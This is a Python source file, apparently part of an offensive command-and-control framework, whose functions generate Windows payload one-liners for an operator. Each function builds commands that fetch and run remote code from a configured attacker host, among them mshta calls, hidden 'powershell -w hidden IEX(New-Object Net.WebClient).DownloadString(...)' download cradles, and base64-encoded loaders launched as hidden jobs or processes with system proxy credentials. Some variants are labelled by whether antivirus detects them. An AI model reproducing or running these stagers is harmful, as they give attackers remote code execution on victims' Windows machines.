
from core.config import *
from core import config
from core.color import bcolors

def hta_paylods():
    if SSL==True:
        print bcolors.OKBLUE + '(LOW):' + bcolors.ENDC
        print 'mshta https://%s:%s%s' % (config.HOST, config.PORT,config.hta_payload)
        print 'powershell -c \"mshta https://%s:%s%s\"' % (config.HOST, config.PORT,config.hta_payload)
        config.PAYLOADS.append('\nmshta https://%s:%s%s' % (config.HOST, config.PORT,config.hta_payload))
        print ''
    else:
        print bcolors.OKBLUE + '(LOW):' + bcolors.ENDC
        print 'mshta http://%s:%s%s' % (config.HOST, config.PORT,config.hta_payload)
        print 'powershell -c \"mshta http://%s:%s%s\"' % (config.HOST, config.PORT,config.hta_payload)
        config.PAYLOADS.append('\nmshta http://%s:%s%s' % (config.HOST, config.PORT,config.hta_payload))
        print ''

def pwsh_job():
    commandJ = "Start-Job -scriptblock {iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('{payload}')))}"
    commandP = 'Start-Process powershell -ArgumentList "iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(\'{payload}\')))" -WindowStyle Hidden'
    payload = "$V=new-object net.webclient;$V.proxy=[Net.WebRequest]::GetSystemWebProxy();$V.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;$S=$V.DownloadString('{HTTP}://{ip}:{port}{raw}');IEX($s)"
    if SSL==True:
        payload = payload.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{raw}",raw_payload).replace("{HTTP}","https")
    else:
        payload = payload.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{raw}",raw_payload).replace("{HTTP}","http")
    payload = payload.encode('base64').replace('\n', '')
    print '---+Powershell JOB Payload+---\n' + commandJ.replace('{payload}', payload)
    print ''
    print '---+Powershell New Process Payload+---\n' + commandP.replace('{payload}', payload)
    print ''
    config.PAYLOADS.append(commandJ.replace('{payload}', payload))
    config.PAYLOADS.append(commandP.replace('{payload}', payload))



def pwsh_file():
    commandF = "iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('{payload}')))"
    payload = "$V=new-object net.webclient;$V.proxy=[Net.WebRequest]::GetSystemWebProxy();$V.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;$S=$V.DownloadString('{HTTP}://{ip}:{port}{hjf}');IEX($s)"
    if SSL==True:
        payload = payload.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{hjf}",hjf_payload).replace("{HTTP}","https")
    else:
        payload = payload.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{hjf}",hjf_payload).replace("{HTTP}","http")
    payload = payload.encode('base64').replace('\n', '')
    print '---+Powershell JOB + File Payload+--- ( Detected by AVs)'
    print commandF.replace('{payload}', payload)
    print ''
    config.PAYLOADS.append(commandF.replace('{payload}', payload))

def pwsh_sct():
    commandF = "iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('{payload}')))"
    payload = "$V=new-object net.webclient;$V.proxy=[Net.WebRequest]::GetSystemWebProxy();$V.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;$S=$V.DownloadString('{HTTP}://{ip}:{port}{hjfs}');IEX($s)"
    if SSL==True:
        payload = payload.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{hjfs}",hjfs_payload).replace("{HTTP}","https")
    else:
        payload = payload.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{hjfs}",hjfs_payload).replace("{HTTP}","http")
    payload = payload.encode('base64').replace('\n', '')
    print '---+Powershell JOB + File +SCT Payload+--- ( Detected by AVs)'
    print commandF.replace('{payload}', payload)
    print ''
    config.PAYLOADS.append(commandF.replace('{payload}', payload))

def simple_payloads():
    payload = """powershell -w hidden \"$h = (New-Object Net.WebClient).DownloadString('{HTTP}://{ip}:{port}{raw}');Invoke-Expression $h;\""""
    payload2 = """powershell -w hidden \"IEX(New-Object Net.WebClient).DownloadString('{HTTP}://{ip}:{port}{raw}');\""""
    payload3 = """powershell -w hidden \"Invoke-Expression(New-Object Net.WebClient).DownloadString('{HTTP}://{ip}:{port}{raw}');\""""
    payload = payload.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{raw}",raw_payload)
    payload2 = payload2.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{raw}",raw_payload)
    payload3 = payload3.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{raw}",raw_payload)
    if SSL==True:
        payload = payload.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{raw}",raw_payload).replace("{HTTP}","https")
        payload2 = payload2.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{raw}",raw_payload).replace("{HTTP}","https")
        payload3 = payload3.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{raw}",raw_payload).replace("{HTTP}","https")
    else:
        payload = payload.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{raw}",raw_payload).replace("{HTTP}","http")
        payload2 = payload2.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{raw}",raw_payload).replace("{HTTP}","http")
        payload3 = payload3.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{raw}",raw_payload).replace("{HTTP}","http")
    print '---+ Powershell simple payloads +---'
    print payload
    print payload2
    print payload3
    print ''
    config.PAYLOADS.append(payload)
    config.PAYLOADS.append(payload2)
    config.PAYLOADS.append(payload3)

def pwsh_base64():

    payload = """powershell -w hidden \"$h = (New-Object Net.WebClient).DownloadString('{HTTP}://{ip}:{port}{b64stager}');Invoke-Expression $h;\""""
    payload2 = """powershell -w hidden \"IEX(New-Object Net.WebClient).DownloadString('{HTTP}://{ip}:{port}{b64stager}');\""""
    payload3 = """powershell -w hidden \"Invoke-Expression(New-Object Net.WebClient).DownloadString('{HTTP}://{ip}:{port}{b64stager}');\""""
    if SSL==True:
        payload = payload.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{b64stager}",b64_stager).replace("{HTTP}","https")
        payload2 = payload2.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{b64stager}",b64_stager).replace("{HTTP}","https")
        payload3 = payload3.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{b64stager}",b64_stager).replace("{HTTP}","https")
    else:
        payload = payload.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{b64stager}",b64_stager).replace("{HTTP}","http")
        payload2 = payload2.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{b64stager}",b64_stager).replace("{HTTP}","http")
        payload3 = payload3.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{b64stager}",b64_stager).replace("{HTTP}","http")
    print '---+ Powershell base64 stager +---'
    print payload
    print payload2
    print payload3
    print ''
    config.PAYLOADS.append('---+ Powershell base64 stager +---')
    config.PAYLOADS.append(payload)
    config.PAYLOADS.append(payload2)
    config.PAYLOADS.append(payload3)


def pwsh_base52():
    payload = """powershell -w hidden \"$h = (New-Object Net.WebClient).DownloadString('{HTTP}://{ip}:{port}{b52stager}');Invoke-Expression $h;\""""
    payload2 = """powershell -w hidden \"IEX(New-Object Net.WebClient).DownloadString('{HTTP}://{ip}:{port}{b52stager}');\""""
    payload3 = """powershell -w hidden \"Invoke-Expression(New-Object Net.WebClient).DownloadString('{HTTP}://{ip}:{port}{b52stager}');\""""
    if SSL==True:
        payload = payload.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{b52stager}",b52_stager).replace("{HTTP}","https")
        payload2 = payload2.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{b52stager}",b52_stager).replace("{HTTP}","https")
        payload3 = payload3.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{b52stager}",b52_stager).replace("{HTTP}","https")
    else:
        payload = payload.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{b52stager}",b52_stager).replace("{HTTP}","http")
        payload2 = payload2.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{b52stager}",b52_stager).replace("{HTTP}","http")
        payload3 = payload3.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{b52stager}",b52_stager).replace("{HTTP}","http")
    print '---+ Powershell base52 stager +---'
    print payload
    print payload2
    print payload3
    print ''
    config.PAYLOADS.append('---+ Powershell base52 stager +---')
    config.PAYLOADS.append(payload)
    config.PAYLOADS.append(payload2)
    config.PAYLOADS.append(payload3)
